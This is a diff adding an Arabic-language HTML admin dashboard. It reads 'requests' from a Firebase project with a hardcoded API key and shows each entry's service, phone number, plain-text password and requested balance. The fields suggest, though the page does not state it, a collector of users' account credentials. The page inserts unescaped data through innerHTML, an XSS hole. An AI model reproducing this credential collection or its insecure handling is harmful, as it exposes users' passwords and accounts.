@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>لوحة تحكم الأدمن</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Cairo', sans-serif;
+      padding: 20px;
+    }
+    h1 {
+      color: #f00;
+      text-align: center;
+    }
+    .request-box {
+      background-color: #111;
+      border: 1px solid #f00;
+      margin: 15px 0;
+      padding: 10px;
+      border-radius: 10px;
+    }
+    .request-box button {
+      background-color: #f00;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      margin-top: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>لوحة التحكم - الطلبات</h1>
+  <div id="requests"></div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
+    import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      authDomain: "starkoscript.firebaseapp.com",
+      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+      projectId: "starkoscript",
+      storageBucket: "starkoscript.appspot.com",
+      messagingSenderId: "381525854892",
+      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const requestsRef = ref(db, 'requests');
+    const requestsDiv = document.getElementById('requests');
+
+    onValue(requestsRef, (snapshot) => {
+      requestsDiv.innerHTML = '';
+      snapshot.forEach((child) => {
+        const data = child.val();
+        const div = document.createElement('div');
+        div.className = 'request-box';
+        div.innerHTML = `
+          <strong>الخدمة:</strong> ${data.service}<br>
+          <strong>الرقم:</strong> ${data.num}<br>
+          ${data.pass ? `<strong>كلمة السر:</strong> ${data.pass}<br>` : ''}
+          ${data.balance ? `<strong>الرصيد المطلوب:</strong> ${data.balance}<br>` : ''}
+          <button onclick="removeRequest('${child.key}')">تم التنفيذ</button>
+        `;
+        requestsDiv.appendChild(div);
+      });
+    });
+
+    window.removeRequest = function(id) {
+      const reqRef = ref(db, 'requests/' + id);
+      remove(reqRef);
+    };
+  </script>
+</body>
+</html>
